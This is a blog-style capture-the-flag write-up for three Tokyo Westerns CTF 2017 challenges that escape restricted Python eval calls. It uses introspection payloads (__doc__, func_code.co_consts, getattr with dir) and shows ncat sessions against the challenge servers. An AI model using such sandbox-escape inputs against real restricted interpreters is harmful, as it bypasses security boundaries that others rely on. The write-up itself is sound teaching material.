---
layout: post
title: "swap"
---
# pplc - tokyo westerns ctf 3rd 2017

The problem description is as follows:

yet another PLC challange as last year's?

private: nc ppc1.chal.ctf.westerns.tokyo 10000

local: nc ppc1.chal.ctf.westerns.tokyo 10001

comment: nc ppc1.chal.ctf.westerns.tokyo 10002

[restricted_python.7z](https://twctf2017.azureedge.net/attachments/restricted_python.7z-9fa38ea88ab7e0fad4f1d7b085dec649140fc6f20665a7a60753156f0b53437a)

these challenges exercised the ability to break out of 3 various restricted python `eval` calls, a nice primer on using builtin python functionality to bypass restrictions! i found that using [ptpython](https://github.com/jonathanslenders/ptpython) was pretty useful since it has tab completion and you are able to surf your history much easier. if you are completely new to python exploitation i recommend going through the picoctf python exploitation challenges, i went through the ones from 2013 and learned quite a lot i was able to use on this challenge. in particular one should know about the [dir](https://docs.python.org/2/library/functions.html#dir) builtin function which returns an alphabetized list of names comprising (some of) the attributes of the given object, and of attributes reachable from it.

## comment
### comment.py
```python
import sys
from restrict import Restrict

r = Restrict()
# r.set_timeout()

d = sys.stdin.read()
assert d is not None
d = d[:20]

import comment_flag
r.seccomp()

print eval(d)
```
### comment_flag.py
```
'''
Welcome to unreadable area!
FLAG is TWCTF{CENSORED}
'''
```

comment was super simple, checking the `__doc__` attribute reveals the flag. docstrings are a string literal that occurs as the first statement in a module, function, class, or method definition. such a docstring becomes the `__doc__` special attribute of that object, according to the [PEP article on Docstrings](https://www.python.org/dev/peps/pep-0257/).

```python
>>> import comment_flag
>>> dir(comment_flag)
['__builtins__', '__doc__', '__file__', '__name__', '__package__']
>>> comment_flag.__doc__
'\nWelcome to unreadable area!\nFLAG is TWCTF{CENSORED}\n'
```

pointing this at the server:

```
$ ncat ppc1.chal.ctf.westerns.tokyo 10002 
comment_flag.__doc__
<ctrl-d>
Welcome to unreadable area!
FLAG is TWCTF{very simple docstring}
```

## local
### local.py
```python
import sys
from restrict import Restrict

r = Restrict()
# r.set_timeout()

def get_flag(x):
    flag = "TWCTF{CENSORED}"
    return x

d = sys.stdin.read()
assert d is not None
d = d[:30]

r.seccomp()

print eval(d)
```

since the problem name implies the use of the `locals()` builtin python function i experimented based on this and through that i found the `func_code` object for `get_flag` and its constants attribute (`co_consts`, see [this blog](http://akaptur.com/blog/2013/11/15/introduction-to-the-python-interpreter-2/) for a brief overview of code objects).

```python
>>> def get_flag(x):
  2     flag = "TWCTF{CENSORED}"
  3     return x
>>> locals()
{'run': <function run at 0x7fb34a8b29b0>, '__builtins__': <module '__builtin__' (built-in)>, '__file__': '/usr/local/bin/ptpython', u'_2': {...}, '__package__': None, 'sys': <module 'sys' (built-in)>, 're': <module 're' from '/usr/lib/python2.7/re.pyc'>, 'get_flag': <function get_flag at 0x7fb348434398>, '__name__': '__main__', '__doc__': None, u'_': {...}}
>>> locals()['get_flag']
<function get_flag at 0x7fb348434398>
>>> dir(locals()['get_flag'])
['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']
>>> locals()['get_flag'].func_code
<code object get_flag at 0x7fb34a7cf3b0, file "<stdin>", line 1>
>>> dir(locals()['get_flag'].func_code)
['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
>>> locals()['get_flag'].func_code.co_consts
(None, 'TWCTF{CENSORED}')
```

the only problem with solving this problem with `locals()` is i couldn't seem to figure out how to keep my code under 30 characters! what i had amounted to 40 characters, so i kept trying things - could i reference `get_flag` directly without using `locals()`? in fact i could - using the same attributes, even:

```python
>>> get_flag.func_code.co_consts
(None, 'TWCTF{CENSORED}')
```

pointing this at the server:
```
$ ncat ppc1.chal.ctf.westerns.tokyo 10001 
get_flag.func_code.co_consts
<ctrl-d>
(None, 'TWCTF{func_code is useful for metaprogramming}')
```

## private
### private.py
```python
import sys
from restrict import Restrict

r = Restrict()
# r.set_timeout()

class Private:
    def __init__(self):
        pass

    def __flag(self):
        return "TWCTF{CENSORED}"

p = Private()
Private = None

d = sys.stdin.read()
assert d is not None
assert "Private" not in d, "Private found!"
d = d[:24]

r.seccomp()

print eval(d)
```

private forces us not to use the string 'Private' in our code. the first thing i noticed was that using `dir` we could bypass writing 'Private':

```python
>>> dir(p)[0]
'_Private__flag'
```

using this and string append i found a string that would bypass the 'Private' restriction but it was too long:

```python
>>> "p.".__add__(dir(p)[0]).__add__("()")
'p._Private__flag()'
>>> eval("p.".__add__(dir(p)[0]).__add__("()"))
'TWCTF{CENSORED}'
>>> "p.".__add__(dir(p)[0]).__add__("()")
'p._Private__flag()'
>>> len('"p.".__add__(dir(p)[0]).__add__("()")')
37
```

surfing around the attributes of `Private` i found `__getattribute__` which is simply a method wrapper around the `getattr` builtin function. `getattr` gets a named attribute from an object; `getattr(x, 'y')` is equivalent to `x.y` according to the documentation. with `getattr` we are able to do the same as i was trying to do before but with less characters!

```python
>>> getattr(p, '_Private__flag')
<bound method Private.__flag of <__main__.Private instance at 0x7f99b1b1b440>>
>>> getattr(p, '_Private__flag')()
'TWCTF{CENSORED}'
>>> getattr(p, dir(p)[0])
<bound method Private.__flag of <__main__.Private instance at 0x7f99b1b1b440>>
>>> getattr(p, dir(p)[0])()
'TWCTF{CENSORED}'
```

pointing this at the server:

```
$ ncat ppc1.chal.ctf.westerns.tokyo 10000 
getattr(p, dir(p)[0])()
<ctrl-d>
TWCTF{__private is not private}
```
